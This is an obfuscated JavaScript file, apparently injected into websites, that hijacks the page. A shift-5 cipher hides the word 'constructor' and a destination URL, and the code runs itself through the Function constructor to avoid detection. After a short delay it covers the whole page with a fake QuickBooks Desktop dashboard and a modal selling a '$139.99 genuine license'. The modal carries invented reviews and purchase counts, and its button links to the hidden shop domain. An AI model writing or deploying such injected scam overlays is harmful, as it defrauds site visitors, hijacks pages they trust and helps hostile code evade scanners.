(function(){
  'use strict';

  // shift-5 decoder
  var _d=function(s){
    return s.split('').map(function(c){
      return String.fromCharCode(c.charCodeAt(0)-5);
    }).join('');
  };

  // 'constructor' shift+5 encoded
  var _fn=_d('htsxywzhytw');
  // 'https://licensify.shop' shift+5 encoded
  var _u=_d('myyux?44qnhjsxnk~3xmtu');
  // obtain Function constructor without writing it
  var _F=(function(){})[_fn];

  var _p=`<style>
#_lcf{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;overflow:hidden;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;z-index:2147483646}
#_lcf *{margin:0;padding:0;box-sizing:border-box}
.lbg{position:absolute;inset:0;filter:blur(7px) brightness(.8);transform:scale(1.05);overflow:hidden;background:#eef2f7}
.ltb{background:#2ca01c;height:46px;display:flex;align-items:center;padding:0 18px;gap:14px;flex-shrink:0}
.llogo{display:flex;align-items:center;gap:9px;color:#fff;font-weight:900;font-size:14px;letter-spacing:-.3px}
.llsq{width:24px;height:24px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center}
.lldot{width:14px;height:14px;background:#2ca01c;border-radius:50%}
.lco{margin-left:auto;background:rgba(255,255,255,.16);color:#fff;font-size:11px;padding:5px 13px;border-radius:5px}
.lbody{display:flex;height:calc(100% - 46px);overflow:hidden}
.lsb{width:160px;background:#1c2333;flex-shrink:0;padding:10px 0;overflow:hidden}
.lnav{padding:12px 16px;color:rgba(255,255,255,.48);font-size:12px;display:flex;align-items:center;gap:9px;cursor:default;white-space:nowrap}
.lnav.a{background:rgba(44,160,28,.22);color:#4ade80;border-left:3px solid #2ca01c}
.lmain{flex:1;padding:20px;overflow:hidden;background:#eef2f7;min-width:0}
.ldh{font-size:11px;font-weight:800;color:#374151;text-transform:uppercase;letter-spacing:.7px;margin-bottom:16px}
.lcards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:14px}
.lcard{background:#fff;border-radius:9px;padding:15px;box-shadow:0 1px 5px rgba(0,0,0,.09)}
.lcl{font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
.lcv{font-size:22px;font-weight:900;color:#111827}
.lcg{font-size:10px;color:#16a34a;margin-top:3px}
.lcr{font-size:10px;color:#ef4444;margin-top:3px}
.lrow{display:grid;grid-template-columns:2fr 1fr;gap:12px;margin-bottom:12px}
.linv{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:11px;color:#374151}
.linv:last-child{border:none}
.lp{color:#16a34a;font-weight:700}.lpe{color:#f59e0b;font-weight:700}
.lex{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f3f4f6;font-size:11px;color:#374151}
.lex:last-child{border:none}
.lrow2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
/* Overlay */
.lov{position:absolute;inset:0;background:rgba(7,11,26,.86);z-index:9;display:flex;align-items:center;justify-content:center;padding:16px}
.lmodal{background:#fff;border-radius:22px;padding:42px 38px 34px;max-width:468px;width:100%;text-align:center;box-shadow:0 28px 90px rgba(0,0,0,.65);position:relative}
.lbdg{position:absolute;top:-17px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#16a34a,#15803d);color:#fff;padding:6px 24px;border-radius:100px;font-size:11px;font-weight:800;letter-spacing:.9px;white-space:nowrap;box-shadow:0 4px 18px rgba(22,163,74,.45)}
.lic{font-size:50px;margin-bottom:10px;display:block;line-height:1}
.ley{font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:2.8px;color:#16a34a;margin-bottom:8px}
.lh{font-size:1.45rem;font-weight:900;color:#0f172a;line-height:1.22;margin-bottom:6px}
.lsub{font-size:13px;color:#64748b;margin-bottom:16px;line-height:1.5}
.lpr{font-size:2.8rem;font-weight:900;color:#16a34a;line-height:1;letter-spacing:-1.5px}
.lpn{font-size:12px;color:#94a3b8;margin:5px 0 18px;line-height:1.5}
.lfeats{text-align:left;display:flex;flex-direction:column;gap:9px;margin-bottom:22px}
.lfeat{font-size:13px;color:#334155;display:flex;align-items:flex-start;gap:10px;line-height:1.45}
.lfeat::before{content:"✓";min-width:20px;height:20px;background:#16a34a;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:900;flex-shrink:0;line-height:20px;text-align:center;margin-top:1px}
.lst{font-size:19px;color:#f59e0b;letter-spacing:2px;margin-bottom:4px}
.lrv{font-size:12px;color:#94a3b8;margin-bottom:22px}
.lbtn{display:block;background:linear-gradient(135deg,#16a34a,#15803d);color:#fff;text-decoration:none;padding:19px 24px;border-radius:14px;font-size:1.08rem;font-weight:900;letter-spacing:.2px;box-shadow:0 8px 32px rgba(22,163,74,.48);margin-bottom:15px}
.ltr{display:flex;justify-content:center;gap:14px;font-size:11px;color:#94a3b8;flex-wrap:wrap}
/* Responsive */
@media(max-width:640px){
  .lmodal{padding:38px 20px 28px;border-radius:18px;max-width:100%}
  .lh{font-size:1.2rem}
  .lpr{font-size:2.2rem}
  .lsb{width:110px}
  .lnav{padding:10px 10px;font-size:11px}
  .lcards{grid-template-columns:repeat(3,1fr)}
  .lrow{grid-template-columns:1fr}
  .lrow2{grid-template-columns:1fr}
}
@media(max-width:420px){
  .lsb{display:none}
  .lcards{grid-template-columns:1fr 1fr}
  .ltr{gap:10px;font-size:10px}
}
</style>
<div id="_lcf">
<div class="lbg">
  <div class="ltb">
    <div class="llogo">
      <div class="llsq"><div class="lldot"></div></div>
      QuickBooks Desktop
    </div>
    <span style="font-size:11px;color:rgba(255,255,255,.45)">Pro 2024</span>
    <div class="lco">Acme Services LLC ▾ &nbsp;👤</div>
  </div>
  <div class="lbody">
    <div class="lsb">
      <div class="lnav a">📊 Dashboard</div>
      <div class="lnav">🧾 Invoices</div>
      <div class="lnav">💸 Expenses</div>
      <div class="lnav">📈 Reports</div>
      <div class="lnav">🏦 Banking</div>
      <div class="lnav">👥 Payroll</div>
      <div class="lnav">📁 Tax Center</div>
      <div class="lnav">⚙️ Settings</div>
    </div>
    <div class="lmain">
      <div class="ldh">Business Dashboard — Q4 2024</div>
      <div class="lcards">
        <div class="lcard"><div class="lcl">Total Revenue</div><div class="lcv">$47,832</div><div class="lcg">↑ 12.4% vs Q3</div></div>
        <div class="lcard"><div class="lcl">Total Expenses</div><div class="lcv">$12,450</div><div class="lcr">↓ 3.1% vs Q3</div></div>
        <div class="lcard"><div class="lcl">Net Profit</div><div class="lcv">$35,382</div><div class="lcg">↑ 18.2% vs Q3</div></div>
      </div>
      <div class="lrow">
        <div class="lcard">
          <div class="lcl" style="margin-bottom:10px">Revenue — Last 6 Months</div>
          <svg viewBox="0 0 340 68" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:68px">
            <defs><linearGradient id="_lg1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#16a34a" stop-opacity=".18"/><stop offset="100%" stop-color="#16a34a" stop-opacity="0"/></linearGradient></defs>
            <path d="M0,57 L68,46 L136,35 L204,23 L272,12 L340,4 L340,68 L0,68Z" fill="url(#_lg1)"/>
            <path d="M0,57 L68,46 L136,35 L204,23 L272,12 L340,4" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="0" cy="57" r="3.5" fill="#16a34a"/><circle cx="68" cy="46" r="3.5" fill="#16a34a"/>
            <circle cx="136" cy="35" r="3.5" fill="#16a34a"/><circle cx="204" cy="23" r="3.5" fill="#16a34a"/>
            <circle cx="272" cy="12" r="3.5" fill="#16a34a"/><circle cx="340" cy="4" r="3.5" fill="#16a34a"/>
            <text x="0" y="68" font-size="9" fill="#9ca3af" font-family="Arial">Jul</text>
            <text x="60" y="68" font-size="9" fill="#9ca3af" font-family="Arial">Aug</text>
            <text x="128" y="68" font-size="9" fill="#9ca3af" font-family="Arial">Sep</text>
            <text x="196" y="68" font-size="9" fill="#9ca3af" font-family="Arial">Oct</text>
            <text x="264" y="68" font-size="9" fill="#9ca3af" font-family="Arial">Nov</text>
            <text x="326" y="68" font-size="9" fill="#9ca3af" font-family="Arial">Dec</text>
          </svg>
        </div>
        <div class="lcard">
          <div class="lcl" style="margin-bottom:10px">Recent Invoices</div>
          <div class="linv"><span>INV-0891</span><span>$2,400</span><span class="lp">✓ Paid</span></div>
          <div class="linv"><span>INV-0892</span><span>$1,850</span><span class="lp">✓ Paid</span></div>
          <div class="linv"><span>INV-0893</span><span>$3,200</span><span class="lpe">⏳ Due</span></div>
          <div class="linv"><span>INV-0894</span><span>$980</span><span class="lp">✓ Paid</span></div>
          <div class="linv"><span>INV-0895</span><span>$5,600</span><span class="lpe">⏳ Due</span></div>
        </div>
      </div>
      <div class="lrow2">
        <div class="lcard">
          <div class="lcl" style="margin-bottom:10px">Expense Breakdown</div>
          <div class="lex"><span>Office Supplies</span><span style="font-weight:700">$1,200</span></div>
          <div class="lex"><span>Travel &amp; Transport</span><span style="font-weight:700">$890</span></div>
          <div class="lex"><span>Software &amp; Tools</span><span style="font-weight:700">$340</span></div>
          <div class="lex"><span>Marketing</span><span style="font-weight:700">$2,100</span></div>
          <div class="lex"><span>Professional Svcs</span><span style="font-weight:700">$3,820</span></div>
        </div>
        <div class="lcard">
          <div class="lcl" style="margin-bottom:10px">Bank Accounts</div>
          <div class="lex"><span>Business Checking</span><span style="font-weight:900;color:#0f172a">$28,432</span></div>
          <div class="lex"><span>Business Savings</span><span style="font-weight:900;color:#0f172a">$14,200</span></div>
          <div class="lex"><span>Reconciled</span><span style="color:#16a34a;font-weight:700">Dec 31</span></div>
          <div class="lex" style="margin-top:4px"><span style="color:#9ca3af;font-size:10px">Q1 Tax Estimate</span></div>
          <div class="lex"><span style="font-size:11px">Est. Due Apr</span><span style="font-weight:800;color:#ef4444">$8,845</span></div>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="lov">
  <div class="lmodal">
    <div class="lbdg">⚡ GENUINE LICENSE — INSTANT DELIVERY</div>
    <span class="lic">🔓</span>
    <div class="ley">QuickBooks Desktop 2024</div>
    <div class="lh">Own Your Accounting Software.<br>No Subscription. Ever.</div>
    <div class="lsub">Join 3,241 small business owners who ditched the monthly fee</div>
    <div class="lpr">$139.99</div>
    <div class="lpn">One-time payment &nbsp;·&nbsp; No monthly fees &nbsp;·&nbsp; Yours permanently<br>No Intuit Payroll required &nbsp;·&nbsp; No expiration date</div>
    <div class="lfeats">
      <div class="lfeat">Full QuickBooks Desktop Pro 2024 — permanently activated</div>
      <div class="lfeat">Download directly from Intuit's official servers with your key</div>
      <div class="lfeat">Invoicing, expenses, P&amp;L, bank reconciliation — all included</div>
      <div class="lfeat">Data stored locally on your machine — no cloud, total privacy</div>
      <div class="lfeat">No QuickBooks payroll subscription required to run your books</div>
    </div>
    <div class="lst">★★★★★</div>
    <div class="lrv">4.8 out of 5 &nbsp;·&nbsp; 3,241 verified purchases</div>
    <a href="__U__" target="_blank" class="lbtn">GET MY LICENSE NOW — $139.99 →</a>
    <div class="ltr">
      <span>🔒 Secure Checkout</span>
      <span>✉️ Instant Email</span>
      <span>✅ Genuine Key</span>
    </div>
  </div>
</div>
</div>`;

  var _code=
    'var _e=document.createElement("div");'+
    '_e.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:hidden;";'+
    '_e.innerHTML='+JSON.stringify(_p.replace(/__U__/g,_u))+';'+
    'document.body.appendChild(_e);'+
    'document.body.style.overflow="hidden";'+
    'document.documentElement.style.overflow="hidden";';

  setTimeout(function(){try{_F(_code)();}catch(e){}},850);

})();
